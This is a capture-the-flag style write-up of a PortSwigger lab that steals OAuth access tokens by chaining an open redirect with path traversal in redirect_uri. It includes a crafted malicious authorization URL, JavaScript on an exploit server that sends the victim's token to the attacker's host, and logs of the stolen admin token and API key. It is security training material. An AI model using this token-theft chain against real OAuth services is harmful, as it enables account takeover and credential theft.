## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/b18ff067-d52b-4107-8230-92fda78a6d32)

## Solution :

### Openredirect vulnerability in the same domain -

When we click on a blog post, we have the option at the bottom of the page called **Next post**. This has a **openredirect vulnerability.** On clicking the button, a *Get* request is sent as follows,

```http
GET /post/next?path=/post?postId=5 HTTP/2
Host: 0a5d001e03be99e881e248de00430091.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: https://0a5d001e03be99e881e248de00430091.web-security-academy.net/post?postId=4
Cookie: session=heLQIqwBKAilLmexsIGfhl0l7Kj5YlH2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```
On changing the path patth parameter to **https://google.com** , we have a redirect to google.com. This confirms that it is vulnerable to openredirect.

```http
HTTP/2 302 Found
Location: http://google.com
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/5be335f2-1c1d-4eb6-ba5f-496e663c7b3e)

### Exploitation -

We can login to the site via social media. The authorization request sent is as follows.

```http
GET /auth?client_id=h7r0ea0g4w5u7fp3o7f8g&redirect_uri=https://0a5d001e03be99e881e248de00430091.web-security-academy.net/oauth-callback&response_type=token&nonce=-1658510961&scope=openid%20profile%20email HTTP/1.1
Host: oauth-0aa300b503cb99fd81f0468d02cf0006.oauth-server.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
```

Here if we give the **redirect_uri=https://google.com**, we get a server error.

```http
HTTP/2 400 Bad Request
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Content-Type: text/html; charset=utf-8
Date: Sat, 23 Sep 2023 20:05:44 GMT
Keep-Alive: timeout=5
Content-Length: 2190
```
This means there is some kind of pretection to prevent stealing of tokens.

We can chain it using the openredirect vuln we found earlier to exploit this & steal admin's token.

The redirect_uri value is `redirect_uri=https://0a5d001e03be99e881e248de00430091.web-security-academy.net/oauth-callback` in the authorization request.

- If we give `redirect_uri=https://0a5d001e03be99e881e248de00430091.web-security-academy.net/oauth-callback/post/next?path=google.com`, we still don't get an redirect.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/74cb4bdd-6997-4775-8873-369fbc4f520e)

> This is because the uri for the next parameter should be `website.com/post/next?path=` and not `website.com/oauth-callback/post/next?path=` as this is invalid uri !

### Directory traversal -

Now we can use directory traversal to traverse up a directory & try to see if redirect works.

The following url redirects us to the first blog post. 

```
https://0a4800d30440d9b880bb4ef700210027.web-security-academy.net/oauth-callback/../post?postId=1
```

This confirms the directory traversal vulnerability.

### Chaining Openredirect + Directory traversal to steal access token -

Now taking into account of all the recon & findings , now we craft a malicious url that when clicked by a user will steal the access token & send it to our exploit server.

```
https://oauth-0a1d0081041dd9c780224c5e029400bf.oauth-server.net/auth?client_id=azf2ozvojqkbpag7k8j4u&redirect_uri=https://0a4800d30440d9b880bb4ef700210027.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ab000cc0476d9fb809e4d6a014e0039.exploit-server.net/exploit&response_type=token&nonce=64781249&scope=openid%20profile%20email
```

On clicking the above link, we are indeed successfully redirected to our exploit server page with the content - **Hello World**.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/ab48229c-b883-4f36-861a-2e11137ebadb)

#### Stealing access token -

The following code will leak the access token via the access log by redirecting users to the exploit server for a second time, with the access token as a query parameter instead.

```js
<script>
window.location = '/?'+document.location.hash.substr(1)
</script>
```

Save the code in the exploit server & once again visit th malicious url .

We have again been redirected to our exploit server as expected.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/3a875bc9-ed2e-4804-b2bc-116d05f95a89)

On viewing the access log, we see that there is an *GET* request which contains the **access token**.

```
152.58.232.176  2023-09-24 08:01:50 +0000 "GET /?access_token=upBJVTJuIwZplR-Rzd1db-zoyg2mYIJk4nBBKWVwPEo&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0"
```
#### Stealing admin's access token -

Now with all set, we now need to create a script such that when admin user clicks the malicious link, the script will execute & as a result admin's access token will be sent to our exploit server.

Enter the following code in the exploit server.

```js
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0a1d0081041dd9c780224c5e029400bf.oauth-server.net/auth?client_id=azf2ozvojqkbpag7k8j4u&redirect_uri=https://0a4800d30440d9b880bb4ef700210027.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ab000cc0476d9fb809e4d6a014e0039.exploit-server.net/exploit&response_type=token&nonce=64781249&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```
Deliver the exploit to victim. Now when the admin user clicks it, we can see the admin's access token in out access log.

```
10.0.4.217      2023-09-24 08:08:42 +0000 "GET /?access_token=X9T1tfyRvZz-fA8BESlos2ZIVYyHvscBKyxqwQ1u7z4&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
```

### Retreive the admin's API key -

When we first logged in via social media as wiener, after the oauth identity provider sends the access token to the client application. It sends a *GET* request to **/me** enndpoint along with the **Authorization: Bearer <Access-token>** to retreive wiener's API key.

Request :
 
```http
GET /me HTTP/2
Host: oauth-0a1d0081041dd9c780224c5e029400bf.oauth-server.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a4800d30440d9b880bb4ef700210027.web-security-academy.net/
Authorization: Bearer _W647JX1vTOAWC3AzSWfkZhrhWgN3C36As8nvoI6gl4
Content-Type: application/json
Origin: https://0a4800d30440d9b880bb4ef700210027.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
```
Response :

```json
{
"sub":"wiener",
"apikey":"DYeC9bixbTFfG6NWc0FiJJUeiU8LN6lk",
"name":"Peter Wiener",
"email":"wiener@hotdog.com",
"email_verified":true
}
```
Replace the value of authorization token with the admin's access token [`X9T1tfyRvZz-fA8BESlos2ZIVYyHvscBKyxqwQ1u7z4`] to retreive the API key of admin.

```json
{
"sub":"administrator",
"apikey":"ztu0Blq17NSVogNVTSHL61ZldwMQG3gj",
"name":"Administrator",
"email":"administrator@normal-user.net",
"email_verified":true
}
```
Submit the key to solve the lab.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/4e46e2cb-f641-4eed-b856-655d83ac9096)

